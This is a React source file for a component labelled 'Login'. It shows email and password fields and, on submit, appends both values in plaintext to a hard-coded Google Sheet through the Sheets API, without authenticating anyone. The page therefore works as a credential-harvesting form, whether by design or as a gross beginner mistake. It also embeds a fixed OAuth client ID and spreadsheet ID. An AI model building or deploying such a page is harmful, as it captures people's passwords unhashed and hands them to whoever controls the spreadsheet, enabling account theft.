import React, { useState, useEffect } from 'react';
import { gapi } from 'gapi-script';

const LoginPage = () => {
  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });

  const [users, setUsers] = useState([]);

  useEffect(() => {
    gapi.load('client:auth2', initClient);
  }, []);

  const initClient = () => {
    gapi.client.init({
      clientId: '352105540042-he9sjo03ensvao6gkaah4d9gk56lthmr.apps.googleusercontent.com', // Replace with your OAuth client ID
      scope: 'https://www.googleapis.com/auth/spreadsheets',
      discoveryDocs: ['https://sheets.googleapis.com/$discovery/rest?version=v4'],
    }).then(() => {
      console.log('GAPI client initialized');
      
      // Ensure the user is signed in
      const authInstance = gapi.auth2.getAuthInstance();
      if (!authInstance.isSignedIn.get()) {
        authInstance.signIn().then(() => {
          console.log('User signed in');
        }).catch((error) => {
          console.error('Sign-in error:', error);
        });
      }
    }).catch((error) => {
      console.error('Error initializing GAPI client:', error);
    });
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleLogin = () => {
    const updatedUsers = [...users, { ...formData }];
    setUsers(updatedUsers);

    const data = [
      ['Email', 'Password'], // Header row
      ...updatedUsers.map((user) => [user.email, user.password]), // Data rows
    ];

    const sheetId = '1-beMZyoOyLT-BEE6dEGfrqOlbA5nIffqiku5INPKcmA'; // Your Google Sheet ID
    const range = 'Sheet1!A1'; // Google Sheets range (Sheet1, A1)

    const valueRange = {
      majorDimension: 'ROWS',
      values: [[formData.email, formData.password]], // Add the current user data
    };

    // Get the Google API client instance and call the Sheets API
    const authInstance = gapi.auth2.getAuthInstance();
    if (authInstance.isSignedIn.get()) {
      gapi.client.sheets.spreadsheets.values.append({
        spreadsheetId: sheetId,
        range: range,
        valueInputOption: 'RAW',
        insertDataOption: 'INSERT_ROWS',
        resource: valueRange,
      }).then((response) => {
        console.log('Data added to Google Sheet', response);
        // Clear form data
        setFormData({
          email: '',
          password: '',
        });
      }).catch((error) => {
        console.error('Error appending data:', error);
      });
    } else {
      console.log('User is not authenticated');
    }
  };

  return (
    <div className="login-container">
      <h1>Login</h1>
      <input
        name="email"
        type="email"
        placeholder="Email"
        value={formData.email}
        onChange={handleChange}
      />
      <input
        name="password"
        type="password"
        placeholder="Password"
        value={formData.password}
        onChange={handleChange}
      />
      <button onClick={handleLogin}>Login</button>
    </div>
  );
};

export default LoginPage;
